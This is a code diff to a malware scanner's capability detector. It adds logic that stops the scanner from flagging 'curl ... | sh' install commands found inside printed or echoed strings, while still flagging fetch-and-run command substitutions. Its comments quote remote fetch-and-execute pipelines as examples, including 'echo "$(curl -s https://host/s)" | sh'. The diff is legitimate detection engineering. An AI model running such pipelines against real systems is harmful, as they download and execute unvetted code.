@@ -25,6 +25,7 @@ composite rule set unchanged.
 
 from __future__ import annotations
 
+import re
 from collections import Counter
 from contextlib import suppress
 from dataclasses import dataclass
@@ -178,6 +179,8 @@ class CapabilityDetector(BaseDetector):
             distinct: set[bytes] = set()
 
             for index, match in enumerate(compiled.match.regex.finditer(raw)):
+                if CapabilityDetector._is_printed_text(content, match.start(), match.end()):
+                    continue
                 if first is None:
                     first = match
                 # Distinct *operations*, not distinct occurrences. Ten calls to
@@ -207,6 +210,145 @@ class CapabilityDetector(BaseDetector):
             )
 
         return hits
+
+    #: Statements whose quoted argument is shown to somebody, not run.
+    #:
+    #: Make's three diagnostic functions, and the printing commands of every shell
+    #: and language that appears in a build file. A capability matched inside the
+    #: string one of these is given is a capability the file TALKS ABOUT.
+    DIAGNOSTIC_STATEMENT = re.compile(
+        rb"""(?ix)
+        ^[ \t]*
+        (?:
+            [@-]{0,2}[ \t]*
+            (?:echo|printf|print|puts|say|warn|
+               console\.(?:log|info|warn|error)|
+               write-host|write-output|write-warning)
+          | \$\((?:warning|info|error)\b
+        )
+        """,
+        re.VERBOSE | re.IGNORECASE,
+    )
+
+    @staticmethod
+    def _is_printed_text(content: FileContent, start: int, end: int) -> bool:
+        """Whether this match sits inside a string that is printed rather than run.
+
+        The worst false positive found against real code, and the clearest. The
+        Makefile in `spf13/cobra` - one of the most depended-upon Go libraries in
+        existence - carries this:
+
+            ifeq (, $(shell which golangci-lint))
+            $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
+            endif
+
+        That is the text printed to a developer who is missing a tool. Cordon read
+        the `curl ... | sh` inside it and reported MALWARE.DROPPER.001 at CRITICAL,
+        in the MALICIOUS category, plus SUSPECT.DROPPER.001 on the same line. An
+        accusation of that weight against a printed help message is not a tuning
+        problem; it is the finding that ends the conversation about whether to adopt
+        the tool.
+
+        Install instructions embedded in diagnostics, READMEs and `echo` lines are
+        everywhere, because `curl ... | sh` is how a great deal of software
+        documents its own installation.
+
+        TWO conditions, and the second is what keeps this from becoming a hole:
+
+        The statement must be a printer, and the match must lie ENTIRELY inside its
+        quoted argument. `echo "run: curl x | sh"` has the whole construct inside
+        the quotes and is text. `echo "$(curl x)" | sh` pipes into a shell, so the
+        `| sh` that makes it dangerous sits OUTSIDE the quotes and is not
+        suppressed. The distinction is exactly the one that matters, and it falls
+        out of the quote test rather than needing a second rule.
+        """
+        line_number = content.line_of(start)
+        line = content.line_text(line_number)
+        if not line:
+            return False
+        encoded = line.encode("utf-8", "surrogatepass")
+        statement = CapabilityDetector.DIAGNOSTIC_STATEMENT.match(encoded)
+        if not statement:
+            return False
+
+        # Both ends inside the same quoted run. `column_of` is one-based, matching
+        # how a finding reports a column.
+        first = content.column_of(start) - 1
+        last = content.column_of(end - 1) - 1
+        opening = CapabilityDetector._quote_depth(line, first)
+        closing = CapabilityDetector._quote_depth(line, last)
+        if opening is None or opening != closing:
+            return False
+
+        # Quoted is not the same as inert. A shell runs `$(...)` and backticks
+        # inside DOUBLE quotes, so `echo "$(curl -s https://host/s)" | sh` really
+        # does fetch and execute -- the quotes are around the output, not around
+        # the command. Suppressing the egress there would have taken one half of
+        # the dropper composite away from a genuine fetch-and-run.
+        #
+        # Single quotes are inert in every shell, so a substitution inside them is
+        # literal text and stays suppressed.
+        # Scanned from the end of the diagnostic statement rather than the start of
+        # the line, because `$(warning ...)` opens with `$(` itself. Make's
+        # `warning`, `info` and `error` are FUNCTIONS, not command substitutions --
+        # only `$(shell ...)` runs anything -- so counting that paren read every
+        # Make diagnostic as executing its own message, which put the cobra
+        # Makefile straight back to critical.
+        return not (
+            opening == '"'
+            and CapabilityDetector._inside_substitution(line, first, begin=statement.end())
+        )
+
+    @staticmethod
+    def _inside_substitution(line: str, offset: int, *, begin: int = 0) -> bool:
+        """Whether `offset` sits inside a `$(...)` or a backtick pair on this line.
+
+        Nesting counted for `$(`, since `$(dirname $(which x))` is ordinary.
+        Backticks cannot nest without escaping, so they toggle.
+
+        `begin` skips the construct that introduced the diagnostic, which in a
+        Makefile is itself spelled `$(`.
+        """
+        depth = 0
+        backtick = False
+        index = begin
+        while index < min(offset, len(line)):
+            if line[index] == "\\":
+                index += 2
+                continue
+            if line.startswith("$(", index):
+                depth += 1
+                index += 2
+                continue
+            if line[index] == ")" and depth:
+                depth -= 1
+            elif line[index] == "`":
+                backtick = not backtick
+            index += 1
+        return depth > 0 or backtick
+
+    @staticmethod
+    def _quote_depth(line: str, offset: int) -> str | None:
+        """Which quote character encloses `offset`, or None if it is unquoted.
+
+        Single and double quotes tracked separately, because a shell treats them
+        differently and an apostrophe inside a double-quoted message -- "couldn't
+        find golangci-lint" -- must not read as opening a single-quoted string.
+        Escaped quotes are skipped for the same reason.
+        """
+        quote: str | None = None
+        index = 0
+        while index < min(offset, len(line)):
+            character = line[index]
+            if character == "\\":
+                index += 2
+                continue
+            if quote is None and character in "\"'":
+                quote = character
+            elif character == quote:
+                quote = None
+            index += 1
+        return quote
 
     def _resolved_capabilities(
         self, unit: FileUnit, content: FileContent
